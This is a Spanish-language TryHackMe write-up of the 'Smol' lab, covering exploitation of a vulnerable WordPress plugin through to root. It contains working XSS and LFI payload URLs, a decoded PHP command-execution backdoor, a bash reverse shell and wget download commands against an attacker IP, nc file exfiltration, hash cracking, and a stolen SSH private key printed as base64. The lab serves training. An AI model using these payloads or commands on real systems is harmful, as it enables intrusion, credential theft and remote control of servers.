---
tags:
  - Cybersecurity
  - Labs
  - TryHackMe
  - Medium
  - HTTP
  - CMS
  - WordPress
  - XSS
  - SSRF
  - LFI
  - RCE
  - SecurityMisconfigurations
  - PrivilegeEscalation
  - JohnTheRipper
  - Sudo
---
- [[#Enumeración|Enumeración]]
	- [[#Enumeración#Ping|Ping]]
	- [[#Enumeración#Nmap|Nmap]]
	- [[#Enumeración#HTTP|HTTP]]
		- [[#HTTP#Fuzzing Web|Fuzzing Web]]
	- [[#Enumeración#WordPress|WordPress]]
- [[#Explotación|Explotación]]
	- [[#Explotación#WordPress - Unauthenticated Cross-Site Scripting (XSS)|WordPress - Unauthenticated Cross-Site Scripting (XSS)]]
	- [[#Explotación#WordPress - Unauthenticated Server Side Request Forgery (SSRF) / LFI|WordPress - Unauthenticated Server Side Request Forgery (SSRF) / LFI]]
	- [[#Explotación#RCE|RCE]]
	- [[#Explotación#Security Misconfigurations|Security Misconfigurations]]
- [[#Escalada de Privilegios|Escalada de Privilegios]]
	- [[#Escalada de Privilegios#Robo de Claves SSH|Robo de Claves SSH]]
	- [[#Escalada de Privilegios#Pivoting entre usuarios|Pivoting entre usuarios]]


---
# Smol
![](Screenshots/618b3fa52f0acc0061fb0172-1718816164594.png)

> En este write-up se documenta la resolución completa de la máquina **Smol** de [TryHackMe](https://tryhackme.com/room/smol). Se explotan múltiples vulnerabilidades en **WordPress**, incluyendo **XSS**, **SSRF**, **LFI** y **RCE**, además de varias malas configuraciones que permiten pivotar entre usuarios y escalar privilegios hasta **root**.

---
## Enumeración
### Ping

`ping -c 1 10.82.154.232`

![](Screenshots/Pasted%20image%2020251223181810.png)
### Nmap

`nmap -p- --open -sS --min-rate 5000 -sS -vvv -n -Pn 10.82.154.232 -oG allPorts`

![](Screenshots/Pasted%20image%2020251223181842.png)

`nmap -p22,80 -sCV 10.82.154.232 -oN targeted`

![](Screenshots/Pasted%20image%2020251223181906.png)
### HTTP

`10.82.154.232`

![](Screenshots/Pasted%20image%2020251223181941.png)

Se tiene que añadir al `/etc/hosts` lo siguiente: `10.82.154.232 www.smol.thm`.

`echo "10.82.154.232 www.smol.thm" >> /etc/hosts`

![](Screenshots/Pasted%20image%2020251223182510.png)

![](Screenshots/Pasted%20image%2020251223182556.png)

Se trata de un **WordPress 6.7.1**.
#### Fuzzing Web

`gobuster dir -u http://www.smol.thm/ -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt -x php,html,txt -t 64`

![](Screenshots/Pasted%20image%2020251223184449.png)
### WordPress

`wpscan --url http://www.smol.thm/ --enumerate u`

![](Screenshots/Pasted%20image%2020251223191944.png)
![](Screenshots/Pasted%20image%2020251223192007.png)

`wpscan --url http://www.smol.thm/ --enumerate ap --force --plugins-detection mixed`

![](Screenshots/Pasted%20image%2020251223192050.png)

Se encuentran dos plugins:
- `akismet 5.2`.
- `jsmol2wp 1.0.7`.

Se realiza una búsqueda y se encuentran estas vulnerabilidades de [Jsmol2wp](https://wpscan.com/plugin/jsmol2wp/):

![](Screenshots/Pasted%20image%2020251223192549.png)

---
## Explotación
### WordPress - Unauthenticated Cross-Site Scripting (XSS)

[JSmol2WP <= 1.07 - Unauthenticated Cross-Site Scripting (XSS)](https://wpscan.com/vulnerability/0bbf1542-6e00-4a68-97f6-48a7790d1c3e/).

`http://www.smol.thm/wp-content/plugins/jsmol2wp/php/jsmol.php?isform=true&call=saveFile&data=%3Cscript%3Ealert(/xss/)%3C/script%3E&mimetype=text/html;%20charset=utf-8`

![](Screenshots/Pasted%20image%2020251223192804.png)
### WordPress - Unauthenticated Server Side Request Forgery (SSRF) / LFI

[JSmol2WP <= 1.07 - Unauthenticated Server Side Request Forgery (SSRF)](https://wpscan.com/vulnerability/ad01dad9-12ff-404f-8718-9ebbd67bf611/).

`http://www.smol.thm/wp-content/plugins/jsmol2wp/php/jsmol.php?isform=true&call=getRawDataFromDatabase&query=php://filter/resource=../../../../wp-config.php`

![](Screenshots/Pasted%20image%2020251223193034.png)

Se accede al panel de control de **WordPress**.

`http://www.smol.thm/wp-admin/`

![](Screenshots/Pasted%20image%2020251223193151.png)

![](Screenshots/Pasted%20image%2020251223193210.png)

Se realiza una búsqueda y se encuentra en `Pages/AllPages`, un documento privado llamado `Webmaster Tasks!!`.

![](Screenshots/Pasted%20image%2020251223195013.png)

### RCE

Se investiga sobre el [Plugin - Hello Dolly](https://github.com/WordPress/hello-dolly).

Usando la **LFI** anterior, se lee el archivo `hello.php`.

`http://www.smol.thm/wp-content/plugins/jsmol2wp/php/jsmol.php?isform=true&call=getRawDataFromDatabase&query=php://filter/resource=../../hello.php`

![](Screenshots/Pasted%20image%2020251223195513.png)

`echo "CiBpZiAoaXNzZXQoJF9HRVRbIlwxNDNcMTU1XHg2NCJdKSkgeyBzeXN0ZW0oJF9HRVRbIlwxNDNceDZkXDE0NCJdKTsgfSA=" | base64 -d`

![](Screenshots/Pasted%20image%2020251223195547.png)

```PHP
if (isset($_GET["cmd"])) {
    system($_GET["cmd"]);
}
```

Al analizar el código, se ejecuta cada vez que un usuario autenticado carga una página del admin, la función se ejecuta.

`http://www.smol.thm/wp-admin/index.php?cmd=ls+-l`

![](Screenshots/Pasted%20image%2020251223200631.png)

`echo "/bin/bash -i >& /dev/tcp/192.168.135.64/1234 0>&1" > revshell`

`python -m http.server 1234`

`http://www.smol.thm/wp-admin/index.php?cmd=wget http://192.168.135.64:1234/revshell -O /tmp/revshell`

`nc -nlvp 1234`

`http://www.smol.thm/wp-admin/index.php?cmd=bash%20/tmp/revshell`

Se obtiene la *Reverse Shell*.

![](Screenshots/Pasted%20image%2020251226105312.png)

Se realiza un tratamiento de la terminal.

`cat /etc/passwd`

![](Screenshots/Pasted%20image%2020251226105622.png)

Se encuentran los usuarios:
- `diego`.
- `xavi`.
- `gege`.
- `think`.
### Security Misconfigurations

Se accede a la BBDD.

`mysql -u wpuser -p`

`show databases;`

![](Screenshots/Pasted%20image%2020251226114455.png)

```SQL
use wordpress;
show tables;
```

![](Screenshots/Pasted%20image%2020251226114526.png)

`SELECT * FROM wp_users;`

![](Screenshots/Pasted%20image%2020251226114614.png)

`vim hashes`

`john hashes --wordlist=/usr/share/wordlists/rockyou.txt`

![](Screenshots/Pasted%20image%2020251226115801.png)

Se encuentra la contraseña del usuario `diego`.

`cd /home/diego`

Se encuentra la *flag* del usuario.

---
## Escalada de Privilegios
### Robo de Claves SSH

`id`

![](Screenshots/Pasted%20image%2020251226121827.png)

`cat /etc/group | grep think`

![](Screenshots/Pasted%20image%2020251226121936.png)

Se accede a la ruta: `/home/think`.

`ls -la`

![](Screenshots/Pasted%20image%2020251226122148.png)

Se observa el directorio `.ssh`.

`cd .ssh`

`ls -la`

![](Screenshots/Pasted%20image%2020251226122304.png)

`cat id_rsa`

![](Screenshots/Pasted%20image%2020251226122337.png)

`cat id_rsa | base64 -w 0`

![](Screenshots/Pasted%20image%2020251226123550.png)

`echo LS0tLS1CRUdJTiBPUEVOU1NIIFBSSVZBVEUgS0VZLS0tLS0KYjNCbGJuTnphQzFyWlhrdGRqRUFBQUFBQkc1dmJtVUFBQUFFYm05dVpRQUFBQUFBQUFBQkFBQUJsd0FBQUFkemMyZ3RjbgpOaEFBQUFBd0VBQVFBQUFZRUF4R3RvUWpZNU5VeW11RCszYjB4ekVZSWhkQmJzbmljcnJudmtNak9nZGJwOHhZS3JmT2dNCmVocmtyRVhqY3FtckZ2WnpwMGhuVm5iYUN5VVY4dkRyeXdzckVpdks3ZDVJRGVmc3NIL1JxUmluT1kzRkVZRStla3pLb0gKK1M2K2pORUtlZE1IN0RhbUxzWHhzQUc1Yi9Bdm0rRnBXbXZOMXlTNXNUZUNlWVUwd3NITVArY2ZNMWNZY0RrRFU2SG1pQwpBMkc0RDUrdVBsdVNIMTNUUzEySnBGeVUzRWpIUXZWNmV2RVJlY3JpSFNmVjBQeE1ycndKRXlPd1NQWUEyYzdSbFloK3RiCmJuaVFSVkFHRTBKYXRvN2txQUpPS1pJdVhIRUlLaEJuRk9JdDVKNXNwNmwvUWZYeFpZUk1CYWl1eU50dE9ZMWJ5TndqNi8KRUV5UWUxWU01Y2hodG1KbS9SV29nOFU2RFpmOEJnQjJLb1ZON2sxMVZHNzQrY21GTWJHUDZ4bjFtUUc2aTJ1M0g2V2NZMQpMQWMwSjFiaHlwR3NQUGNFMDY5MzRzOWpyS2lOOVhrOUJHN0hDbkRoWTJBNmJDNmJpRTRVcWZVM2lrTlFaTVh3Q3ZGOHZZCkhENHpkT2dhVU04UHFpOTBXQ0dFY0dQdFRmVy9kUGU0K1hvcVptY1ZBQUFGaUs0N2orYXVPNC9tQUFBQUIzTnphQzF5YzIKRUFBQUdCQU1ScmFFSTJPVFZNcHJnL3QyOU1jeEdDSVhRVzdKNG5LNjU3NURJem9IVzZmTVdDcTN6b0RIb2E1S3hGNDNLcApxeGIyYzZkSVoxWjIyZ3NsRmZMdzY4c0xLeElyeXUzZVNBM243TEIvMGFrWXB6bU54UkdCUG5wTXlxQi9rdXZvelJDbm5UCkIrdzJwaTdGOGJBQnVXL3dMNXZoYVZwcnpkY2t1YkUzZ25tRk5NTEJ6RC9uSHpOWEdIQTVBMU9oNW9nZ05odUErZnJqNWIKa2g5ZDAwdGRpYVJjbE54SXgwTDFlbnJ4RVhuSzRoMG4xZEQ4VEs2OENSTWpzRWoyQU5uTzBaV0lmclcyNTRrRVZRQmhOQwpXcmFPNUtnQ1RpbVNMbHh4Q0NvUVp4VGlMZVNlYktlcGYwSDE4V1dFVEFXb3JzamJiVG1OVzhqY0krdnhCTWtIdFdET1hJClliWmladjBWcUlQRk9nMlgvQVlBZGlxRlRlNU5kVlJ1K1BuSmhUR3hqK3NaOVprQnVvdHJ0eCtsbkdOU3dITkNkVzRjcVIKckR6M0JOT3ZkK0xQWTZ5b2pmVjVQUVJ1eHdwdzRXTmdPbXd1bTRoT0ZLbjFONHBEVUdURjhBcnhmTDJCdytNM1RvR2xEUApENm92ZEZnaGhIQmo3VTMxdjNUM3VQbDZLbVpuRlFBQUFBTUJBQUVBQUFHQkFJeHVYblE0WUY2REZ3L1VQa29NMXBoRitiClVPVHM0a0kwNzB0UXBQYndHOCswZ2JUSkJaTjlKMU45a1RmcktVTEFhVzNjbFVNczNXMjczc0hlMDc0dG1nZW9MYlhKTUUKd1c5dnlnSEc0UmVNME1LTlljQktMMmt4VGczQ0tFRVNpTXJIaTlNSVRwN1phelgwRC9lcDFWbERSV3pRUWczMkphbDRqawpyeHhDNkozMkFSb1BISGVRWmFDV29wSkF4cG04cmZLc0hBNE1za25TeGY0Sm1abnJjc21pR0V4ekpRWCtsV1FiQmFKWi9DCncxUlBqbU8vZkoxNmZxY3JleUEraE1lQVMwVmQ2clVxUmtaY1kvMC9hQTN6R1VnWGFhZWlLdHNjaktKcWVYWjY2L05pWUQKNlhoVy9PMy91QndlcFRWL2Nrd3pkRFlEM3YyM1l1SnAxd1VPUEcvN2lUWWRRWFAxRlNIWVFNZC9DKzM3Z3lVUmxaSnFaZwplOFNoY2RnVTRodGFrYlNBOEsycFl3YVNucHhzcC9MSGs5YWRRaTRiQjBpOGJDVFg4SFFxelU4emdhTzlld2pMcEdCd2Y0ClkwcU5Obzh3eVRsdUdyS2Y3MnZEYmFqdGk5Und1TzV3WGhkaStSTmhrdHV2NkI0YUdMVG1EcE5VazVVQUxrbkQycUFRQUEKQU1CVStFOHNxYmYyb1ZtYjZ0eVB1NlB3L1NycGs1Y2FRdzhEbjVSdkc4VmNkUHNkQ1NjMjlaK2ZyY0RrV04yT3FMK2IwQgp6Yk9oR3AvWXdQaEppMDk4bnVqWEVwU2llZDhKQ0tPMFI5d1UvbHVXS2VvcnZJUWxwYUtBNVREWmF6dHJGcUJrRThGRkVRCmdLTE90WDNFWDJQMTFaQjlVWC9uRDljMzBqRVc3TnJWY3JDMHFtdHM0SFNwcjFyZ2dJbStKSW9tOHhKUVd1Vks0MkRtdW4KbEpxTkQwWWZTZ041cHFZNGhOZXFXSXoyRW5yRnhmTWFTelVGYWNLOFdMUVhWUDJ4OEFBQURCQVBrY0cxWlU0ZFJJd2xYRQpYWDA2MERzSjlvbU5ZUEhPWFZsUG1Pb3Y3VWxsNlRPZHYxa2FVdUNzemYyZGhsMUEvQkJrR1BRRFA1aEtyT2RyaDh2Y1JSCkErRW9nL3kwbHc2Q0RVRGZ3R1FycURLUnhWVlVjTmJHTmhqZ254UlJnMk9ERU9LOUc4R3NKdVJZaWhUWnAwTG5pTTJmSGQKakFvU0FFdVhmUzcrOHpHWjlrOVZETDhqYU5OTStCWCtEWlBKczJGeE81TUh1N1NPL3lVOXdLZi96c3V1NUtsa1lHRmdMVgpJZmE0WDJhbkYxSFRKSlZmWVdVQldBUFBzS1NmWDFVUUFBQU1FQXlkbzJVbkJRaEpVaWEzdXgyTGdURGU0Rk1sZHdaK3l5ClBpRmYrRW5LOTk0SHVBa1cybDNSMzZQTitCb091YTdnMWcxR0h2ZU1mQi9uSGg0ekVCN3JoWUxGdUR5Wi8vOEl6dVRhVE4KN2tHY0Y3eU9ZQ2Q3b1JtVFFMVVplR3o3V0JyM3lkbUNQUExESmU3VGo5NHJvWDh0Z3dNTzVXQ3VXSHltNk9zOHowTktLUgp1NzQybVEvVWZlVDZObkNKV0hUb3JOcEpPMWZPZXhxMWttRktDTW5jSUlObms4WkYxQkJSUVp0ZmpNdko0NHNqOU9pNGFFCjgxRFhvN01mR20wYlNGQUFBQUVuUm9hVzVyUUhWaWRXNTBkWE5sY25abGNnPT0KLS0tLS1FTkQgT1BFTlNTSCBQUklWQVRFIEtFWS0tLS0tCg== | base64 -d > thinkrsa`
`
`chmod 600 thinkrsa`

`ssh -i thinkrsa think@www.smol.thm`

![](Screenshots/Pasted%20image%2020251226123710.png)
### Pivoting entre usuarios

`id`

![](Screenshots/Pasted%20image%2020251226123938.png)

`cat /etc/group`

![](Screenshots/Pasted%20image%2020251226124107.png)

`su gege`

Se accede al directorio `/home/gege`.

`ls -la`

![](Screenshots/Pasted%20image%2020251226124421.png)

`unzip wordpress.old.zip`

![](Screenshots/Pasted%20image%2020251226124528.png)

Esta protegido.

`nc -nlvp 9999 > wordpress.old.zip`

`nc -w 3 192.168.135.64 9999 < wordpress.old.zip`

`zip2john wordpress.old.zip > ziphash`

`john --wordlist=/usr/share/wordlists/rockyou.txt ziphash`

![](Screenshots/Pasted%20image%2020251226193331.png)

`unzip wordpress.old.zip`

`cat wp-config.php`

![](Screenshots/Pasted%20image%2020251226130617.png)

`su xavi`

`sudo -l`

![](Screenshots/Pasted%20image%2020251226131113.png)

`sudo su`

![](Screenshots/Pasted%20image%2020251226131147.png)

La *flag* de *root* se encuentra: `/root`.

---
